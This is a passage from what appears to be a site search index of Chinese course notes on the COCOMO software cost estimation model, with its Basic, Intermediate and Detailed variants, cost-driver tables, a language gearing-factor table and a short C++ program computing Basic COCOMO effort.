COCOMO model: Basic COCOMO Model Intermediate COCOMO Model Detailed COCOMO Model The first level, Basic COCOMO can be used for quick and slightly rough calculations of Software Costs. Its accuracy is somewhat restricted due to the absence of sufficient factor considerations. Intermediate COCOMO takes these Cost Drivers into account and Detailed COCOMO additionally accounts for the influence of individual project phases, i.e in case of Detailed it accounts for both these cost drivers and also calculations are performed phase wise henceforth producing a more accurate result. These two models are further discussed below. \u6839\u636e MBA\u667a\u5e93\u767e\u79d1 \u3002 COCOMO\u6a21\u578b\u6309\u5176\u8be6\u7ec6\u7a0b\u5ea6\u53ef\u4ee5\u5206\u4e3a\u4e09\u7ea7\uff1a\u57fa\u672cCOCOMO\u6a21\u578b\uff0c\u4e2d\u95f4COCOMO\u6a21\u578b\uff0c\u8be6\u7ec6COCOMO\u6a21\u578b\u3002 \u57fa\u672cCOCOMO\u6a21\u578b \u662f\u4e00\u4e2a\u9759\u6001\u5355\u53d8\u91cf\u6a21\u578b\uff0c\u5b83\u7528\u4e00\u4e2a\u5df2\u4f30\u7b97\u51fa\u6765\u7684\u539f\u4ee3\u7801\u884c\u6570\uff08LOC\uff09\u4e3a\u81ea\u53d8\u91cf\u7684\u7ecf\u9a8c\u51fd\u6570\u8ba1\u7b97\u8f6f\u4ef6\u5f00\u53d1\u5de5\u4f5c\u91cf\u3002 \u4e2d\u7ea7COCOMO\u6a21\u578b \u5728\u57fa\u672cCOCOMO\u6a21\u578b\u7684\u57fa\u7840\u4e0a\uff0c\u518d\u7528\u8bbe\u8ba1\u4ea7\u54c1\u3001\u786c\u4ef6\u3001\u4eba\u5458\u3001\u9879\u76ee\u7b49\u65b9\u9762\u7684\u5f71\u54cd\u56e0\u7d20\u8c03\u6574\u5de5\u4f5c\u91cf\u7684\u4f30\u7b97\u3002 \u8be6\u7ec6COCOMO\u6a21\u578b \u5305\u62ec\u4e2d\u95f4COCOMO\u6a21\u578b\u7684\u6240\u6709\u7279\u6027\uff0c\u4f46\u66f4\u8fdb\u4e00\u6b65\u8003\u8651\u4e86\u8f6f\u4ef6\u5de5\u7a0b\u4e2d\u6bcf\u4e00\u6b65\u9aa4\uff08\u5982\u5206\u6790\u3001\u8bbe\u8ba1\uff09\u7684\u5f71\u54cd\u3002 \u4ee3\u7801\u884c\u6570\u53ef\u4ee5\u901a\u8fc7\u300a\u8f6f\u4ef6\u8fc7\u7a0b-\u5b9e\u8df5\u8005\u7684\u7814\u7a76\u65b9\u6cd5\u300b\u4e00\u4e66\u4e2d\u5f15\u7528\u7684 Quantative Software Management \u6240\u7edf\u8ba1\u7684\u8868\u683c\u3002 Programming Language Avg Median Low High ABAP (SAP) * 28 18 16 60 ASP* 51 54 15 69 Assembler * 119 98 25 320 Brio + 14 14 13 16 C * 97 99 39 333 C++ * 50 53 25 80 C# * 54 59 29 70 COBOL * 61 55 23 297 Cognos Impromptu Scripts + 47 42 30 100 Cross System Products (CSP) + 20 18 10 38 Cool:Gen/IEF * 32 24 10 82 Datastage 71 65 31 157 Excel * 209 191 131 315 Focus * 43 45 45 45 FoxPro 36 35 34 38 HTML * 34 40 14 48 J2EE * 46 49 15 67 Java * 53 53 14 134 JavaScript * 47 53 31 63 JCL * 62 48 25 221 LINC II 29 30 22 38 Lotus Notes * 23 21 19 40 Natural * 40 34 34 53 .NET * 57 60 53 60 Oracle * 37 40 17 60 PACBASE * 35 32 22 60 Perl * 24 15 15 60 PL/I * 64 80 16 80 PL/SQL * 37 35 13 60 Powerbuilder * 26 28 7 40 REXX * 77 80 50 80 Sabretalk * 70 66 45 109 SAS * 38 37 22 55 Siebel * 59 60 51 60 SLOGAN * 75 75 74 75 SQL * 21 21 13 37 VB.NET * 52 60 26 60 Visual Basic * 42 44 20 60 How should I use the range? The range simply shows lowest and highest gearing factors for each language. The range can be combined with the average and median, to choose a \"most likely\" gearing factor for estimation. The range can be useful as a starting point for choosing an uncertainty range around your \"most likely\" estimate of the gearing factor. Where does the data come from? The gearing factors in this table were drawn from 2192 recently completed function point projects in the QSM database . As mixed-language projects are not a reliable source of gearing factors, only single-language projects are used. 4. \u6a21\u578b # COCOMO\u5206\u4e3a3\u79cd\u6a21\u578b\uff0c\u4ece\u7b80\u5355\u5230\u590d\u6742\uff0c\u4e0b\u9762\u662f\u5177\u4f53\u7684\u8ba1\u7b97\u4f8b\u5b50\u3002 4.1. Basic Model # Effort = a(KLOC)^b time = c(Effort)^d Personrequired = Effort / time The above formula is used for the cost estimation of for the basic COCOMO model, and also is used in the subsequent models. The constant values a,b,c and d for the Basic Model for the different categories of system: SOFTWARE PROJECTS A B C D Organic 2.4 1.05 2.5 0.38 Semi Detached 3.0 1.12 2.5 0.35 Embedded 3.6 1.20 2.5 0.32 The effort is measured in Person-Months and as evident from the formula is dependent on Kilo-Lines of code. The development time is measured in Months. These formulas are used as such in the Basic Model calculations, as not much consideration of different factors such as reliability, expertise is taken into account, henceforth the estimate is rough. Below is the C++ program for Basic COCOMO // C++ program to implement basic COCOMO #include<bits/stdc++.h> using namespace std; // Function for rounding off float to int int fround(float x) { int a; x=x+0.5; a=x; return(a); } // Function to calculate parameters of Basic COCOMO void calculate(float table[][4], int n,char mode[][15], int size) { float effort,time,staff; int model; // Check the mode according to size if(size>=2 && size<=50) model=0; //organic else if(size>50 && size<=300) model=1; //semi-detached else if(size>300) model=2; //embedded cout<<\"The mode is \"<<mode[model]; // Calculate Effort effort = table[model][0]*pow(size,table[model][1]); // Calculate Time time = table[model][2]*pow(effort,table[model][3]); //Calculate Persons Required staff = effort/time; // Output the values calculated cout<<\"\\nEffort = \"<<effort<<\" Person-Month\"; cout<<\"\\nDevelopment Time = \"<<time<<\" Months\"; cout<<\"\\nAverage Staff Required = \"<<fround(staff)<<\" Persons\"; } int main() { float table[3][4]={2.4,1.05,2.5,0.38,3.0,1.12,2.5,0.35,3.6,1.20,2.5,0.32}; char mode[][15]={\"Organic\",\"Semi-Detached\",\"Embedded\"}; int size = 4; calculate(table,3,mode,size); return 0; } Output: The mode is Organic Effort = 10.289 Person-Month Development Time = 6.06237 Months Average Staff Required = 2 Persons 4.2. Intermediate Model # The basic Cocomo model assumes that the effort is only a function of the number of lines of code and some constants evaluated according to the different software system. However, in reality, no system\u2019s effort and schedule can be solely calculated on the basis of Lines of Code. For that, various other factors such as reliability, experience, Capability. These factors are known as Cost Drivers and the Intermediate Model utilizes 15 such drivers for cost estimation. Classification of Cost Drivers and their attributes: Product attributes Required software reliability extent Size of the application database The complexity of the product Hardware attributes Run-time performance constraints Memory constraints The volatility of the virtual machine environment Required turnabout time Personnel attributes Analyst capability Software engineering capability Applications experience Virtual machine experience Programming language experience Project attributes Use of software tools Application of software engineering methods Required development schedule COST DRIVERS VERY LOW LOW NOMINAL HIGH VERY HIGH Product Attributes Required Software Reliability 0.75 0.88 1.00 1.15 1.40 Size of Application Database 0.94 1.00 1.08 1.16 Complexity of The Product 0.70 0.85 1.00 1.15 1.30 Hardware Attributes Runtime Performance Constraints 1.00 1.11 1.30 Memory Constraints 1.00 1.06 1.21 Volatility of the virtual machine environment 0.87 1.00 1.15 1.30 Required turnabout time 0.94 1.00 1.07 1.15 Personnel attributes Analyst capability 1.46 1.19 1.00 0.86 0.71 Applications experience 1.29 1.13 1.00 0.91 0.82 Software engineer capability 1.42 1.17 1.00 0.86 0.70 Virtual machine experience 1.21 1.10 1.00 0.90 Programming language experience 1.14 1.07 1.00 0.95 Project Attributes Application of software engineering methods 1.24 1.10 1.00 0.91 0.82 Use of software tools 1.24 1.10 1.00 0.91 0.83 Required development schedule 1.23 1.08 1.00 1.04 1.10 The project manager is to rate these 15 different parameters for a particular project on a scale of one to three. Then, depending on these ratings, appropriate cost driver values are taken from the above table. These 15 values are then multiplied to calculate the EAF (Effort Adjustment Factor). The Intermediate COCOMO formula now takes the form: E = (a(KLOC)^b) * EAF The values of a and b in case of the intermediate model are as follows: SOFTWARE PROJECTS A B Organic 3.2 1.05 Semi Detached 3.0 1.12 Embeddedc 2.8 1.20 4.3. Detailed Model # Detailed COCOMO incorporates all characteristics of the intermediate version with an assessment of the cost driver's impact on each step of the software engineering process. The detailed model uses different effort multipliers for each cost driver attribute. In detailed cocomo, the whole software is divided into different modules and then we apply COCOMO in different modules to estimate effort and then sum the effort. The Six phases of detailed COCOMO are: Planning and requirements System design Detailed design Module code and test Integration and test Cost Constructive model The effort is calculated as a function of program size and a set of cost drivers are given according to each phase of the software lifecycle. \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"6.COCOMO\u5de5\u4f5c\u91cf\u4f30\u8ba1\u6a21\u578b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/6.COCOMO%E5%B7%A5%E4%BD%9C%E9%87%8F%E4%BC%B0%E8%AE%A1%E6%A8%A1%E5%9E%8B/#cocomo","text":"","title":"COCOMO\u5de5\u4f5c\u91cf\u4f30\u8ba1\u6a21\u578b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/6.COCOMO%E5%B7%A5%E4%BD%9C%E9%87%8F%E4%BC%B0%E8%AE%A1%E6%A8%A1%E5%9E%8B/#_1","text":"COCOMO\u5de5\u4f5c\u91cf\u4f30\u8ba1\u6a21\u578b \u76ee\u5f55 1. \u80cc\u666f 2. \u6982\u8ff0 3. \u5b9a\u4e49 4. \u6a21\u578b 4.1. Basic Model 4.2. Intermediate Model 4.3. Detailed Model","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/6.COCOMO%E5%B7%A5%E4%BD%9C%E9%87%8F%E4%BC%B0%E8%AE%A1%E6%A8%A1%E5%9E%8B/#1","text":"\u6700\u8fd1\u5728\u300a\u8f6f\u4ef6\u534f\u540c\u8bbe\u8ba1\u300b\u8bfe\u7a0b\u4e2d\u5b66\u4e60\u4e86COCOMO\u5de5\u4f5c\u91cf\u4f30\u8ba1\u6a21\u578b\uff0c\u5728\u6b64\u8fdb\u884c\u603b\u7ed3\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/6.COCOMO%E5%B7%A5%E4%BD%9C%E9%87%8F%E4%BC%B0%E8%AE%A1%E6%A8%A1%E5%9E%8B/#2","text":"\u6784\u9020\u6027\u6210\u672c\u6a21\u578b\uff08COCOMO\uff0cConstructive Cost Model\uff09\u662f\u7531\u5df4\u91cc\u00b7\u52c3\u59c6\uff08Barry Boehm\uff09\u63d0\u51fa\u7684\u4e00\u79cd\u8f6f\u4ef6\u6210\u672c\u4f30\u7b97\u65b9\u6cd5\u3002\u8fd9\u79cd\u6a21\u578b\u4f7f\u7528\u4e00\u79cd\u57fa\u672c\u7684\u56de\u5f52\u5206\u6790\u516c\u5f0f\uff0c\u4f7f\u7528\u4ece\u9879\u76ee\u5386\u53f2\u548c\u73b0\u72b6\u4e2d\u7684\u67d0\u4e9b\u7279\u5f81\u4f5c\u4e3a\u53c2\u6570\u6765\u8fdb\u884c\u8ba1\u7b97\u3002\u4ece\u672c\u8d28\u4e0a\u8bf4\u662f\u4e00\u79cd\u53c2\u6570\u5316\u7684\u9879\u76ee\u4f30\u7b97\u65b9\u6cd5\uff0c\u53c2\u6570\u5efa\u6a21\u662f\u628a\u9879\u76ee\u7684\u67d0\u4e9b\u7279\u5f81\u4f5c\u4e3a\u53c2\u6570\uff0c\u901a\u8fc7\u5efa\u7acb\u4e00\u4e2a\u6570\u5b57\u6a21\u578b\u9884\u6d4b\u9879\u76ee\u6210\u672c\u3002","title":"2. \u6982\u8ff0"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/6.COCOMO%E5%B7%A5%E4%BD%9C%E9%87%8F%E4%BC%B0%E8%AE%A1%E6%A8%A1%E5%9E%8B/#3","text":"\u4ece GeeksforGeeks\u7684\u4e00\u7bc7\u535a\u5ba2 \u4e2d\u6458\u53d6COCOMO\u6a21\u578b\u7684\u5185\u5bb9\u3002 Cocomo (Constructive Cost Model) is a regression model based on LOC, i.e number of Lines of Code. It is a procedural cost estimate model for software projects and often used as a process of reliably predicting the various parameters associated with making a project such as size, effort, cost, time and quality. It was proposed by Barry Boehm in 1970 and is based on the study of 63 projects, which make it one of the best-documented models. The key parameters which define the quality of any software products, which are also an outcome of the Cocomo are primarily Effort & Schedule: Effort: Amount of labor that will be required to complete a task. It is measured in person-months units. Schedule: Simply means the amount of time required for the completion of the job, which is, of course, proportional to the effort put. It is measured in the units of time such as weeks, months. Different models of Cocomo have been proposed to predict the cost estimation at different levels, based on the amount of accuracy and correctness required. All of these models can be applied to a variety of projects, whose characteristics determine the value of constant to be used in subsequent calculations. These characteristics pertaining to different system types are mentioned below. Boehm\u2019s definition of organic, semidetached, and embedded systems: Organic \u2013 A software project is said to be an organic type if the team size required is adequately small, the problem is well understood and has been solved in the past and also the team members have a nominal experience regarding the problem. Semi-detached \u2013 A software project is said to be a Semi-detached type if the vital characteristics such as team-size, experience, knowledge of the various programming environment lie in between that of organic and Embedded. The projects classified as Semi-Detached are comparatively less familiar and difficult to develop compared to the organic ones and require more experience and better guidance and creativity. Eg: Compilers or different Embedded Systems can be considered of Semi-Detached type. Embedded \u2013 A software project with requiring the highest level of complexity, creativity, and experience requirement fall under this category. Such software requires a larger team size than the other two models and also the developers need to be sufficiently experienced and creative to develop such complex models. MBA\u667a\u5e93\u767e\u79d1 \u4e2d\u4e5f\u5bf9\u4e09\u79cd\u7c7b\u578b\u505a\u4e86\u5b9a\u4e49\u3002 COCOMO\u6a21\u578b\u4e2d\uff0c\u8003\u8651\u5230\u5f00\u53d1\u73af\u5883\u7684\u4e0d\u540c\uff0c\u8f6f\u4ef6\u5f00\u53d1\u9879\u76ee\u7684\u7c7b\u578b\u53ef\u4ee5\u5206\u4e3a3\u79cd\uff1a \u7ec4\u7ec7\u578b\uff08organic\uff09\uff1a\u76f8\u5bf9\u8f83\u5c0f\u3001\u8f83\u7b80\u5355\u7684\u8f6f\u4ef6\u9879\u76ee\u3002\u5f00\u53d1\u4eba\u5458\u5bf9\u5f00\u53d1\u76ee\u6807\u7406\u89e3\u6bd4\u8f83\u5145\u5206\uff0c\u4e0e\u8f6f\u4ef6\u7cfb\u7edf\u76f8\u5173\u7684\u5de5\u4f5c\u7ecf\u9a8c\u4e30\u5bcc\uff0c\u5bf9\u8f6f\u4ef6\u7684\u4f7f\u7528\u73af\u5883\u5f88\u719f\u6089\uff0c\u53d7\u786c\u4ef6\u7684\u7ea6\u675f\u8f83\u5c0f\uff0c\u7a0b\u5e8f\u7684\u89c4\u6a21\u4e0d\u662f\u5f88\u5927\uff08<50000\u884c\uff09\u3002 \u5d4c\u5165\u578b\uff08embedded\uff09\uff1a\u8981\u6c42\u5728\u7d27\u5bc6\u8054\u7cfb\u7684\u786c\u4ef6\u3001\u8f6f\u4ef6\u548c\u64cd\u4f5c\u7684\u9650\u5236\u6761\u4ef6\u4e0b\u8fd0\u884c\uff0c\u901a\u5e38\u4e0e\u67d0\u79cd\u590d\u6742\u7684\u786c\u4ef6\u8bbe\u5907\u7d27\u5bc6\u7ed3\u5408\u5728\u4e00\u8d77\u3002\u5bf9\u63a5\u53e3\u3001\u6570\u636e\u7ed3\u6784\u3001\u7b97\u6cd5\u7684\u8981\u6c42\u5f88\u9ad8\uff0c\u8f6f\u4ef6\u89c4\u6a21\u4efb\u610f\u3002\u5982\u5927\u800c\u590d\u6742\u7684\u4e8b\u52a1\u5904\u7406\u7cfb\u7edf\uff0c\u5927\u578b/\u8d85\u5927\u578b\u64cd\u4f5c\u7cfb\u7edf\uff0c\u822a\u5929\u7528\u63a7\u5236\u7cfb\u7edf\uff0c\u5927\u578b\u6307\u6325\u7cfb\u7edf\u7b49\u3002 \u534a\u72ec\u7acb\u578b\uff08semidetached\uff09\uff1a\u4ecb\u4e8e\u4e0a\u8ff0\u4e24\u79cd\u8f6f\u4ef6\u4e4b\u95f4\u3002\u89c4\u6a21\u548c\u590d\u6742\u5ea6\u90fd\u5c5e\u4e8e\u4e2d\u7b49\u6216\u66f4\u9ad8\u3002\u6700\u5927\u53ef\u8fbe30\u4e07\u884c\u3002 All the above system types utilize different values of the constants used in Effort Calculations. Types of Models : COCOMO consists of a hierarchy of three increasingly detailed and accurate forms. Any of the three forms can be adopted according to our requirements. These are types of COCOMO model: Basic COCOMO Model Intermediate COCOMO Model Detailed COCOMO Model The first level, Basic COCOMO can be used for quick and slightly rough calculations of Software Costs. Its accuracy is somewhat restricted due to the absence of sufficient factor considerations. Intermediate COCOMO takes these Cost Drivers into account and Detailed COCOMO additionally accounts for the influence of individual project phases, i.e in case of Detailed it accounts for both these cost drivers and also calculations are performed phase wise henceforth producing a more accurate result. These two models are further discussed below. \u6839\u636e MBA\u667a\u5e93\u767e\u79d1 \u3002 COCOMO\u6a21\u578b\u6309\u5176\u8be6\u7ec6\u7a0b\u5ea6\u53ef\u4ee5\u5206\u4e3a\u4e09\u7ea7\uff1a\u57fa\u672cCOCOMO\u6a21\u578b\uff0c\u4e2d\u95f4COCOMO\u6a21\u578b\uff0c\u8be6\u7ec6COCOMO\u6a21\u578b\u3002 \u57fa\u672cCOCOMO\u6a21\u578b \u662f\u4e00\u4e2a\u9759\u6001\u5355\u53d8\u91cf\u6a21\u578b\uff0c\u5b83\u7528\u4e00\u4e2a\u5df2\u4f30\u7b97\u51fa\u6765\u7684\u539f\u4ee3\u7801\u884c\u6570\uff08LOC\uff09\u4e3a\u81ea\u53d8\u91cf\u7684\u7ecf\u9a8c\u51fd\u6570\u8ba1\u7b97\u8f6f\u4ef6\u5f00\u53d1\u5de5\u4f5c\u91cf\u3002 \u4e2d\u7ea7COCOMO\u6a21\u578b \u5728\u57fa\u672cCOCOMO\u6a21\u578b\u7684\u57fa\u7840\u4e0a\uff0c\u518d\u7528\u8bbe\u8ba1\u4ea7\u54c1\u3001\u786c\u4ef6\u3001\u4eba\u5458\u3001\u9879\u76ee\u7b49\u65b9\u9762\u7684\u5f71\u54cd\u56e0\u7d20\u8c03\u6574\u5de5\u4f5c\u91cf\u7684\u4f30\u7b97\u3002 \u8be6\u7ec6COCOMO\u6a21\u578b \u5305\u62ec\u4e2d\u95f4COCOMO\u6a21\u578b\u7684\u6240\u6709\u7279\u6027\uff0c\u4f46\u66f4\u8fdb\u4e00\u6b65\u8003\u8651\u4e86\u8f6f\u4ef6\u5de5\u7a0b\u4e2d\u6bcf\u4e00\u6b65\u9aa4\uff08\u5982\u5206\u6790\u3001\u8bbe\u8ba1\uff09\u7684\u5f71\u54cd\u3002 \u4ee3\u7801\u884c\u6570\u53ef\u4ee5\u901a\u8fc7\u300a\u8f6f\u4ef6\u8fc7\u7a0b-\u5b9e\u8df5\u8005\u7684\u7814\u7a76\u65b9\u6cd5\u300b\u4e00\u4e66\u4e2d\u5f15\u7528\u7684 Quantative Software Management \u6240\u7edf\u8ba1\u7684\u8868\u683c\u3002 Programming Language Avg Median Low High ABAP (SAP) * 28 18 16 60 ASP* 51 54 15 69 Assembler * 119 98 25 320 Brio + 14 14 13 16 C * 97 99 39 333 C++ * 50 53 25 80 C# * 54 59 29 70 COBOL * 61 55 23 297 Cognos Impromptu Scripts + 47 42 30 100 Cross System Products (CSP) + 20 18 10 38 Cool:Gen/IEF * 32 24 10 82 Datastage 71 65 31 157 Excel * 209 191 131 315 Focus * 43 45 45 45 FoxPro 36 35 34 38 HTML * 34 40 14 48 J2EE * 46 49 15 67 Java * 53 53 14 134 JavaScript * 47 53 31 63 JCL * 62 48 25 221 LINC II 29 30 22 38 Lotus Notes * 23 21 19 40 Natural * 40 34 34 53 .NET * 57 60 53 60 Oracle * 37 40 17 60 PACBASE * 35 32 22 60 Perl * 24 15 15 60 PL/I * 64 80 16 80 PL/SQL * 37 35 13 60 Powerbuilder * 26 28 7 40 REXX * 77 80 50 80 Sabretalk * 70 66 45 109 SAS * 38 37 22 55 Siebel * 59 60 51 60 SLOGAN * 75 75 74 75 SQL * 21 21 13 37 VB.NET * 52 60 26 60 Visual Basic * 42 44 20 60 How should I use the range? The range simply shows lowest and highest gearing factors for each language. The range can be combined with the average and median, to choose a \"most likely\" gearing factor for estimation. The range can be useful as a starting point for choosing an uncertainty range around your \"most likely\" estimate of the gearing factor. Where does the data come from? The gearing factors in this table were drawn from 2192 recently completed function point projects in the QSM database . As mixed-language projects are not a reliable source of gearing factors, only single-language projects are used.","title":"3. \u5b9a\u4e49"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/6.COCOMO%E5%B7%A5%E4%BD%9C%E9%87%8F%E4%BC%B0%E8%AE%A1%E6%A8%A1%E5%9E%8B/#4","text":"COCOMO\u5206\u4e3a3\u79cd\u6a21\u578b\uff0c\u4ece\u7b80\u5355\u5230\u590d\u6742\uff0c\u4e0b\u9762\u662f\u5177\u4f53\u7684\u8ba1\u7b97\u4f8b\u5b50\u3002","title":"4. \u6a21\u578b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/6.COCOMO%E5%B7%A5%E4%BD%9C%E9%87%8F%E4%BC%B0%E8%AE%A1%E6%A8%A1%E5%9E%8B/#41-basic-model","text":"Effort = a(KLOC)^b time = c(Effort)^d Personrequired = Effort / time The above formula is used for the cost estimation of for the basic COCOMO model, and also is used in the subsequent models. The constant values a,b,c and d for the Basic Model for the different categories of system: SOFTWARE PROJECTS A B C D Organic 2.4 1.05 2.5 0.38 Semi Detached 3.0 1.12 2.5 0.35 Embedded 3.6 1.20 2.5 0.32 The effort is measured in Person-Months and as evident from the formula is dependent on Kilo-Lines of code. The development time is measured in Months. These formulas are used as such in the Basic Model calculations, as not much consideration of different factors such as reliability, expertise is taken into account, henceforth the estimate is rough. Below is the C++ program for Basic COCOMO // C++ program to implement basic COCOMO #include<bits/stdc++.h> using namespace std; // Function for rounding off float to int int fround(float x) { int a; x=x+0.5; a=x; return(a); } // Function to calculate parameters of Basic COCOMO void calculate(float table[][4], int n,char mode[][15], int size) { float effort,time,staff; int model; // Check the mode according to size if(size>=2 && size<=50) model=0; //organic else if(size>50 && size<=300) model=1; //semi-detached else if(size>300) model=2; //embedded cout<<\"The mode is \"<<mode[model]; // Calculate Effort effort = table[model][0]*pow(size,table[model][1]); // Calculate Time time = table[model][2]*pow(effort,table[model][3]); //Calculate Persons Required staff = effort/time; // Output the values calculated cout<<\"\\nEffort = \"<<effort<<\" Person-Month\"; cout<<\"\\nDevelopment Time = \"<<time<<\" Months\"; cout<<\"\\nAverage Staff Required = \"<<fround(staff)<<\" Persons\"; } int main() { float table[3][4]={2.4,1.05,2.5,0.38,3.0,1.12,2.5,0.35,3.6,1.20,2.5,0.32}; char mode[][15]={\"Organic\",\"Semi-Detached\",\"Embedded\"}; int size = 4; calculate(table,3,mode,size); return 0; } Output: The mode is Organic Effort = 10.289 Person-Month Development Time = 6.06237 Months Average Staff Required = 2 Persons","title":"4.1. Basic Model"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/6.COCOMO%E5%B7%A5%E4%BD%9C%E9%87%8F%E4%BC%B0%E8%AE%A1%E6%A8%A1%E5%9E%8B/#42-intermediate-model","text":"The basic Cocomo model assumes that the effort is only a function of the number of lines of code and some constants evaluated according to the different software system. However, in reality, no system\u2019s effort and schedule can be solely calculated on the basis of Lines of Code. For that, various other factors such as reliability, experience, Capability. These factors are known as Cost Drivers and the Intermediate Model utilizes 15 such drivers for cost estimation. Classification of Cost Drivers and their attributes: Product attributes Required software reliability extent Size of the application database The complexity of the product Hardware attributes Run-time performance constraints Memory constraints The volatility of the virtual machine environment Required turnabout time Personnel attributes Analyst capability Software engineering capability Applications experience Virtual machine experience Programming language experience Project attributes Use of software tools Application of software engineering methods Required development schedule COST DRIVERS VERY LOW LOW NOMINAL HIGH VERY HIGH Product Attributes Required Software Reliability 0.75 0.88 1.00 1.15 1.40 Size of Application Database 0.94 1.00 1.08 1.16 Complexity of The Product 0.70 0.85 1.00 1.15 1.30 Hardware Attributes Runtime Performance Constraints 1.00 1.11 1.30 Memory Constraints 1.00 1.06 1.21 Volatility of the virtual machine environment 0.87 1.00 1.15 1.30 Required turnabout time 0.94 1.00 1.07 1.15 Personnel attributes Analyst capability 1.46 1.19 1.00 0.86 0.71 Applications experience 1.29 1.13 1.00 0.91 0.82 Software engineer capability 1.42 1.17 1.00 0.86 0.70 Virtual machine experience 1.21 1.10 1.00 0.90 Programming language experience 1.14 1.07 1.00 0.95 Project Attributes Application of software engineering methods 1.24 1.10 1.00 0.91 0.82 Use of software tools 1.24 1.10 1.00 0.91 0.83 Required development schedule 1.23 1.08 1.00 1.04 1.10 The project manager is to rate these 15 different parameters for a particular project on a scale of one to three. Then, depending on these ratings, appropriate cost driver values are taken from the above table. These 15 values are then multiplied to calculate the EAF (Effort Adjustment Factor). The Intermediate COCOMO formula now takes the form: E = (a(KLOC)^b) * EAF The values of a and b in case of the intermediate model are as follows: SOFTWARE PROJECTS A B Organic 3.2 1.05 Semi Detached 3.0 1.12 Embeddedc 2.8 1.20","title":"4.2. Intermediate Model"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/6.COCOMO%E5%B7%A5%E4%BD%9C%E9%87%8F%E4%BC%B0%E8%AE%A1%E6%A8%A1%E5%9E%8B/#43-detailed-model","text":"Detailed COCOMO incorporates all characteristics of the intermediate version with an assessment of the cost driver's impact on each step of the software engineering process. The detailed model uses different effort multipliers for each cost driver attribute. In detailed cocomo, the whole software is divided into different modules and then we apply COCOMO in different modules to estimate effort and then sum the effort. The Six phases of detailed COCOMO are: Planning and requirements System design Detailed design Module code and test Integration and test Cost Constructive model The effort is calculated as a function of program size and a set of cost drivers are given according to each phase of the software lifecycle. \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"4.3. Detailed Model"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/7.UML%E5%9B%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","text":"UML\u56fe\u5b66\u4e60\u7b14\u8bb0 # \u76ee\u5f55 # UML\u56fe\u5b66\u4e60\u7b14\u8bb0 \u76ee\u5f55 1. \u80cc\u666f 1. \u80cc\u666f # \u6700\u8fd1\u5728\u300a\u8f6f\u4ef6\u534f\u540c\u8bbe\u8ba1\u300b\u8bfe\u7a0b\u4e2d\u5b66\u4e60\u4e86UML\u56fe\uff0c\u5728\u6b64\u8fdb\u884c\u603b\u7ed3\u3002","title":"7.UML\u56fe\u5b66\u4e60\u7b14\u8bb0"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/7.UML%E5%9B%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#uml","text":"","title":"UML\u56fe\u5b66\u4e60\u7b14\u8bb0"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/7.UML%E5%9B%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#_1","text":"UML\u56fe\u5b66\u4e60\u7b14\u8bb0 \u76ee\u5f55 1. 